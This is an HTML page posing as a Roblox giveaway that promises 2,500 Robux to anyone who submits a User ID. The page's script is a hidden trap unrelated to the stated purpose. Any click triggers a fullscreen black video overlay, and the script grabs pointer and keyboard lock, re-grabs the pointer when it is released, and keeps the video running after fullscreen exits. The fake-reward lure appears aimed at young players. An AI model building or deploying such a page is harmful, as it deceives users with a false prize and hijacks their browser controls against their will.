<!DOCTYPE html>
<html>
<head>
  <title>Roblox Giveaway Entry</title>
  <meta property="og:title" content="Roblox Giveaway Entry">
  <meta property="og:description" content="Enter your User ID to participate in the 2500 Robux giveaway!">
  <style>
    #overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: #000;
      z-index: 9999;
    }
    #overlay video {
      width: 100%;
      height: 100%;
      object-fit: contain;
      display: block;
      cursor: none;
    }
    #overlay video::-webkit-media-controls,
    #overlay video::-webkit-media-controls-enclosure,
    #overlay video::-webkit-media-controls-panel { display: none !important; }
  </style>
</head>
<body>
<h1>Roblox Giveaway Entry</h1>
    
    <h3>How it Works</h3>
    <ul>
        <li>Enter your <strong>User ID</strong> in the field below.</li>
        <li>Your account will automatically receive up to <strong>2,500 Robux</strong> delivered via Roblox Plus.</li>
    </ul>

    <form>
        <label for="userid">Roblox User ID:</label>
        <input type="text" id="userid" name="userid" placeholder="e.g., 12345678" required>
        <button type="submit">Submit Entry</button>
    </form>

  <div id="overlay">
    <video id="v" src="video.mp4" playsinline webkit-playsinline></video>
  </div>

  <script>
    const overlay = document.getElementById('overlay');
    const v = document.getElementById('v');

    function showVideo() {
      overlay.style.display = 'block';
      document.body.style.background = '#000';
    }

    document.addEventListener('click', async () => {
      showVideo();
      v.play();

      const el = document.documentElement;
      if (el.requestFullscreen) await el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

      try { await v.requestPointerLock({ unadjustedMovement: true }); } catch { try { await v.requestPointerLock(); } catch {} }

      if (navigator.keyboard?.lock) {
        try {
          await navigator.keyboard.lock();
        } catch {}
      }
    });

    document.addEventListener('pointerlockchange', () => {
      if ((document.fullscreenElement || document.webkitFullscreenElement) && !document.pointerLockElement) {
        try { v.requestPointerLock(); } catch {}
      }
    });

    const onFsChange = () => {
      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        document.exitPointerLock?.();
        navigator.keyboard?.unlock?.();
        // keep overlay visible and video playing after exiting fullscreen
        showVideo();
      }
    };
    document.addEventListener('fullscreenchange', onFsChange);
    document.addEventListener('webkitfullscreenchange', onFsChange);
  </script>
</body>
</html>
